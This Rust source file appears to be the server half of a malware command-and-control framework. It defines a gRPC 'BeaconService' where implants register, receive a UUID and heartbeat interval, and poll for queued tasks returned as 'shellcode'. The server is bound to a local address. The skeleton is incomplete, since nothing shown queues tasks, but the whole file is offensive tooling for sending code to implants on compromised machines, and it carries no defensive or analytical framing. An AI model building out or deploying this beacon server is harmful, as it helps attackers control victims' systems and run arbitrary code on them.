use std::collections::{HashMap, VecDeque};

use tokio::sync::RwLock;
use tonic::{transport::Server, Request, Response, Status};
use uuid::Uuid;

use tasks::{
    beacon_service_server::{BeaconService, BeaconServiceServer},
    ConnectionRequest, ConnectionResponse, PollRequest, PollResponse,
};
pub mod tasks {
    tonic::include_proto!("tasks");
}

type Task = String;
const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant

#[derive(Debug, Default)]
pub struct Implant {
    tasks: VecDeque<Task>,
}

#[derive(Debug, Default)]
pub struct Beacon {
    implants: RwLock<HashMap<Uuid, Implant>>,
}

#[tonic::async_trait]
impl BeaconService for Beacon {
    async fn connection(
        &self,
        _request: Request<ConnectionRequest>,
    ) -> Result<Response<ConnectionResponse>, Status> {
        let id = Uuid::new_v4();

        println!("Got a connection request");

        let mut map = self.implants.write().await;
        map.insert(id, Implant::default());

        Ok(Response::new(ConnectionResponse {
            uuid: id.to_string(),
            heartbeat: HEARTBEAT,
        }))
    }

    // type PollStream = Pin<Box<dyn Stream<Item = Result<PollResponse, Status>> + Send + 'static>>;

    async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
        let id = Uuid::parse_str(&request.into_inner().uuid);
        if id.is_err() {
            return Err(Status::invalid_argument("Failed to parse uuid."));
        }

        let mut map = self.implants.write().await;
        Ok(Response::new(PollResponse {
            shellcode: match map.get_mut(&id.unwrap()) {
                Some(v) => v.tasks.pop_front(),
                None => {
                    return Err(Status::not_found(
                        "Client doesn't exist or isn't connected.",
                    ))
                }
            },
        }))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50055".parse()?;
    let beacon = Beacon::default();

    Server::builder()
        .add_service(BeaconServiceServer::new(beacon))
        .serve(addr)
        .await?;

    Ok(())
}
